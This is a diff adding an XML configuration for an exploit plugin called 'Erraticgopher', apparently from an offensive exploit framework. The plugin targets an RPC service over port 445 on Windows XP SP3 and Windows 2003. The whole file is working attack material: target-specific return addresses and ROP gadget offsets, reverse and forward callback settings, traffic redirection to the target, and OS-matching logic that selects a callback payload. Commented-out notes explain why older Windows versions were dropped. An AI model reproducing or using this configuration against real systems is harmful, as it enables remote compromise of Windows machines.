@@ -1,0 +1,223 @@
+<?xml version="1.0"?>
+<t:config id="690f669b2682fb96513cc33c5d6e7f8016081e63"
+          name="Erraticgopher"
+          version="1.0.1"
+          configversion="1.0.1.0"
+          xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'
+          xmlns:t='tc0'>
+  <t:inputparameters>
+	<t:parameter name="TargetIp"
+                 xdevmap="TARGET_IP_V4_ADDRESS"
+                 description="Target IP Address"
+                 type="IPv4"/>        
+    
+	<t:parameter name="TargetPort"
+                 xdevmap="TARGET_PORT"
+                 description="Target port"
+                 type="TcpPort"
+                 default="445"/>
+	
+	<t:paramchoice 
+                 name="ConnectionDirection"
+                 xdevmap="TARGET_CONNECTION_DIRECTION"
+                 description="Egg callback (Reverse callback) or Listener (Forward callback)"
+                 default="0">
+        <t:paramgroup name="0" description="Reverse callback">
+            <t:parameter name="CallbackIp"
+                         xdevmap="EXPLOIT_CALLBACK_IP_V4_ADDRESS"
+                         description="Callback IP Address"
+                         type="IPv4"/>
+        </t:paramgroup>
+        <t:paramgroup name="1" description="Forward callback">
+        </t:paramgroup>
+    </t:paramchoice>
+    <t:parameter name="CallbackPort"
+                 xdevmap="EXPLOIT_CALLBACK_PORT"
+                 description="Callback port or call in port"
+                 type="TcpPort"/>
+
+	
+     <t:paramchoice  
+        name="Target"
+        xdevmap="TARGET_PLATFORM"
+        description="Target Operating System Version">
+        <!-- 2000 SP4 - Doesn't appear to allow access to Dimsvc over the 'browser' pipe, only over the 'router'
+             pipe. So the interface will only be reachable with credentials. Exploit does not currently support
+             credential use.
+        <t:paramgroup name="WIN2K_SP4" description="Windows 2000 SP4">
+            <t:parameter name="EggOffset" description=""        type="U32" value="0x28" hidden="true"/>
+            <t:parameter name="RsaenhBase" description=""       type="U32" value="0" hidden="true"/>
+            <t:parameter name="MaxEggSize" description=""       type="U32" value="0x06D0" hidden="true"/>
+            <t:parameter name="LockStackOffset" description=""  type="U32" value="0x00E0" hidden="true"/>
+            <t:parameter name="InitialRetAddr" description=""   type="U32" value="0x7CA0C02F" hidden="true"/>
+        </t:paramgroup>
+        -->
+        <!-- XP SP2 - Can't find the lock handle on the stack to cleanup, so exploiting will disable RRAS service.
+             One option would be to patch in the location of the lock, but that is language dependent. Probably
+             not too many XP SP2 RRAS boxes out there, so leaving it.
+        <t:paramgroup name="WINXP_SP2" description="Windows XP SP2">
+            <t:parameter name="EggOffset" description=""        type="U32" value="0xE4" hidden="true"/>
+            <t:parameter name="RsaenhBase" description=""       type="U32" value="0x0FFD0000" hidden="true"/>
+            <t:parameter name="MaxEggSize" description=""       type="U32" value="0x06D0" hidden="true"/>
+            <t:parameter name="LockStackOffset" description=""  type="U32" value="0x019C" hidden="true"/>
+            <t:parameter name="InitialRetAddr" description=""   type="U32" value="0x000134D3" hidden="true"/>
+            <t:parameter name="RwAddress" description=""        type="U32" value="0x00024588" hidden="true"/>
+            <t:parameter name="ZeroEax" description=""          type="U32" value="0x0001095F" hidden="true"/>
+            <t:parameter name="MovEspEax" description=""        type="U32" value="0x000135E8" hidden="true"/>
+            <t:parameter name="StoreEaxEcx" description=""      type="U32" value="0x00010278" hidden="true"/>
+            <t:parameter name="SkipJunk" description=""         type="U32" value="0x00014502" hidden="true"/>
+            <t:parameter name="SkipJunkPadding" description=""  type="U32" value="0x0000000C" hidden="true"/>
+            <t:parameter name="GetVProtIndex" description=""    type="U32" value="0x0000A08D" hidden="true"/>
+            <t:parameter name="vProtIndex" description=""       type="U32" value="0x00000089" hidden="true"/>
+            <t:parameter name="vProtPadding" description=""     type="U32" value="0x0000000C" hidden="true"/>
+            <t:parameter name="SetupEbx" description=""         type="U32" value="0x00014505" hidden="true"/>
+            <t:parameter name="SysCallAddr" description=""      type="U32" value="0x7FFE0300" hidden="true"/>
+            <t:parameter name="JumpEbx" description=""          type="U32" value="0x00014D7C" hidden="true"/>
+            <t:parameter name="JumpEbxPadding" description=""   type="U32" value="0x00000010" hidden="true"/>
+            <t:parameter name="Ret14" description=""            type="U32" value="0x000069A8" hidden="true"/>
+            <t:parameter name="JumpEsp" description=""          type="U32" value="0x00018F89" hidden="true"/>
+        </t:paramgroup>
+        -->
+        <t:paramgroup name="XPSP3" description="Windows XP SP3">
+            <t:parameter name="EggOffset" description=""        type="U32" value="0xE4" hidden="true"/>
+            <t:parameter name="RsaenhBase" description=""       type="U32" value="0x68000000" hidden="true"/>
+            <t:parameter name="MaxEggSize" description=""       type="U32" value="0x0690" hidden="true"/>
+            <t:parameter name="LockStackOffset" description=""  type="U32" value="0x0190" hidden="true"/>
+            <t:parameter name="InitialRetAddr" description=""   type="U32" value="0x00014E7A" hidden="true"/>
+            <t:parameter name="RwAddress" description=""        type="U32" value="0x00032020" hidden="true"/>
+            <t:parameter name="ZeroEax" description=""          type="U32" value="0x000121DE" hidden="true"/>
+            <t:parameter name="MovEspEax" description=""        type="U32" value="0x00014F88" hidden="true"/>
+            <t:parameter name="StoreEaxEcx" description=""      type="U32" value="0x0001137E" hidden="true"/>
+            <t:parameter name="SkipJunk" description=""         type="U32" value="0x00015EA3" hidden="true"/>
+            <t:parameter name="SkipJunkPadding" description=""  type="U32" value="0x0000000C" hidden="true"/>
+            <t:parameter name="GetVProtIndex" description=""    type="U32" value="0x0000A965" hidden="true"/>
+            <t:parameter name="vProtIndex" description=""       type="U32" value="0x00000089" hidden="true"/>
+            <t:parameter name="vProtPadding" description=""     type="U32" value="0x0000000C" hidden="true"/>
+            <t:parameter name="SetupEbx" description=""         type="U32" value="0x00015EA5" hidden="true"/>
+            <t:parameter name="SysCallAddr" description=""      type="U32" value="0x7FFE0300" hidden="true"/>
+            <t:parameter name="JumpEbx" description=""          type="U32" value="0x00011740" hidden="true"/>
+            <t:parameter name="JumpEbxPadding" description=""   type="U32" value="0x00000010" hidden="true"/>
+            <t:parameter name="Ret14" description=""            type="U32" value="0x0000692d" hidden="true"/>
+            <t:parameter name="JumpEsp" description=""          type="U32" value="0x00011899" hidden="true"/>
+        </t:paramgroup>
+        <t:paramgroup name="W2K3SP0" description="Windows 2003 SP0">
+            <t:parameter name="EggOffset" description=""        type="U32" value="0x28" hidden="true"/>
+            <t:parameter name="RsaenhBase" description=""       type="U32" value="0" hidden="true"/>
+            <t:parameter name="MaxEggSize" description=""       type="U32" value="0x06B0" hidden="true"/>
+            <t:parameter name="LockStackOffset" description=""  type="U32" value="0x00E0" hidden="true"/>
+            <t:parameter name="InitialRetAddr" description=""   type="U32" value="0x0FFEF4C9" hidden="true"/>
+        </t:paramgroup>
+        <t:paramgroup name="W2K3SP1" description="Windows 2003 SP1">
+            <t:parameter name="EggOffset" description=""        type="U32" value="0xC4" hidden="true"/>
+            <t:parameter name="RsaenhBase" description=""       type="U32" value="0x68000000" hidden="true"/>
+            <t:parameter name="MaxEggSize" description=""       type="U32" value="0x06B0" hidden="true"/>
+            <t:parameter name="LockStackOffset" description=""  type="U32" value="0x0170" hidden="true"/>
+            <t:parameter name="InitialRetAddr" description=""   type="U32" value="0x00015BD8" hidden="true"/>
+            <t:parameter name="RwAddress" description=""        type="U32" value="0x0002BA08" hidden="true"/>
+            <t:parameter name="ZeroEax" description=""          type="U32" value="0x00012CE6" hidden="true"/>
+            <t:parameter name="MovEspEax" description=""        type="U32" value="0x00015CF4" hidden="true"/>
+            <t:parameter name="StoreEaxEcx" description=""      type="U32" value="0x00011EB9" hidden="true"/>
+            <t:parameter name="SkipJunk" description=""         type="U32" value="0x00015D8B" hidden="true"/>
+            <t:parameter name="GetVProtIndex" description=""    type="U32" value="0x000092A1" hidden="true"/>
+            <t:parameter name="vProtIndex" description=""       type="U32" value="0x0000008F" hidden="true"/>
+            <t:parameter name="vProtPadding" description=""     type="U32" value="0x00000008" hidden="true"/>
+            <t:parameter name="SetupEbx" description=""         type="U32" value="0x00015D8D" hidden="true"/>
+            <t:parameter name="SysCallAddr" description=""      type="U32" value="0x7FFE0300" hidden="true"/>
+            <t:parameter name="JumpEbx" description=""          type="U32" value="0x0001227B" hidden="true"/>
+            <t:parameter name="Ret14" description=""            type="U32" value="0x0000694E" hidden="true"/>
+            <t:parameter name="JumpEsp" description=""          type="U32" value="0x000123D4" hidden="true"/>
+        </t:paramgroup>
+        <t:paramgroup name="W2K3SP2" description="Windows 2003 SP2">
+            <t:parameter name="EggOffset" description=""        type="U32" value="0xC4" hidden="true"/>
+            <t:parameter name="RsaenhBase" description=""       type="U32" value="0x68000000" hidden="true"/>
+            <t:parameter name="MaxEggSize" description=""       type="U32" value="0x06B0" hidden="true"/>
+            <t:parameter name="LockStackOffset" description=""  type="U32" value="0x0170" hidden="true"/>
+            <t:parameter name="InitialRetAddr" description=""   type="U32" value="0x00015F8B" hidden="true"/>
+            <t:parameter name="RwAddress" description=""        type="U32" value="0x000312C0" hidden="true"/>
+            <t:parameter name="ZeroEax" description=""          type="U32" value="0x00012F87" hidden="true"/>
+            <t:parameter name="MovEspEax" description=""        type="U32" value="0x000160A4" hidden="true"/>
+            <t:parameter name="StoreEaxEcx" description=""      type="U32" value="0x00012121" hidden="true"/>
+            <t:parameter name="SkipJunk" description=""         type="U32" value="0x0001613B" hidden="true"/>
+            <t:parameter name="GetVProtIndex" description=""    type="U32" value="0x00009391" hidden="true"/>
+            <t:parameter name="vProtIndex" description=""       type="U32" value="0x0000008F" hidden="true"/>
+            <t:parameter name="vProtPadding" description=""     type="U32" value="0x00000008" hidden="true"/>
+            <t:parameter name="SetupEbx" description=""         type="U32" value="0x0001613D" hidden="true"/>
+            <t:parameter name="SysCallAddr" description=""      type="U32" value="0x7FFE0300" hidden="true"/>
+            <t:parameter name="JumpEbx" description=""          type="U32" value="0x000124E3" hidden="true"/>
+            <t:parameter name="Ret14" description=""            type="U32" value="0x00009946" hidden="true"/>
+            <t:parameter name="JumpEsp" description=""          type="U32" value="0x0001263C" hidden="true"/>
+        </t:paramgroup>
+    </t:paramchoice>                                               
+  </t:inputparameters>
+
+
+  <t:outputparameters>
+    <t:parameter name="Contract"
+                 description="The contract fulfilled by this plugin"
+                 type="String"
+                 value="StagedUpload"/>
+    <t:parameter name="XorMask"
+             description=""
+             type="U8"/>
+    <t:parameter name="ConnectedTcp"
+                 description="Connected TCP Socket to target"
+                 type="Socket"/>
+  </t:outputparameters>
+
+  <t:redirection>
+    <t:local protocol="TCP"
+             listenaddr="TargetIp"
+             listenport="TargetPort"
+             destaddr="//identifier"
+             destport="//service[name='rpc']/port"
+             closeoncompletion="true"/>
+    <t:local protocol="TCP"
+            listenaddr="TargetIp"
+            listenport="CallbackPort"
+            destaddr="//identifier"
+            destport="CallbackPort"
+            closeoncompletion="true"/>
+     <t:remote protocol="TCP"
+               listenaddr="CallbackIp"
+               listenport="CallbackPort"
+               destport="CallbackPort"/>
+  </t:redirection>
+  
+  <t:logic>
+    <t:and>
+        <t:service name="rpc">
+            <t:bindtopath name="TargetPort" path="//service[name='rpc']/port"/>
+        </t:service>
+        <t:or>
+			<!--
+            <t:os family="windows" name="Windows XP" servicepack="0">
+                <t:bindtovalue name="Target" value="XPSP0"/>
+            </t:os>
+            <t:os family="windows" name="Windows XP" servicepack="1">
+                <t:bindtovalue name="Target" value="XPSP1"/>
+            </t:os>
+            <t:os family="windows" name="Windows XP" servicepack="2">
+                <t:bindtovalue name="Target" value="XPSP2"/>
+            </t:os>
+			-->
+            <t:os family="windows" name="Windows XP" servicepack="3">
+                <t:bindtovalue name="Target" value="XPSP3"/>
+            </t:os>
+            <t:os family="windows" name="Windows 2003" servicepack="0">
+                <t:bindtovalue name="Target" value="W2K3SP0"/>
+            </t:os>
+            <t:os family="windows" name="Windows 2003" servicepack="1">
+                <t:bindtovalue name="Target" value="W2K3SP1"/>
+            </t:os>
+            <t:os family="windows" name="Windows 2003" servicepack="2">
+                <t:bindtovalue name="Target" value="W2K3SP2"/>
+            </t:os>
+        </t:or> 
+        <t:not>
+            <t:os architecture="x86 64-bit"/>
+        </t:not>
+        <t:bindtovalue name="Payload" value="Callback"/>
+    </t:and>
+  </t:logic>  
+
+</t:config>
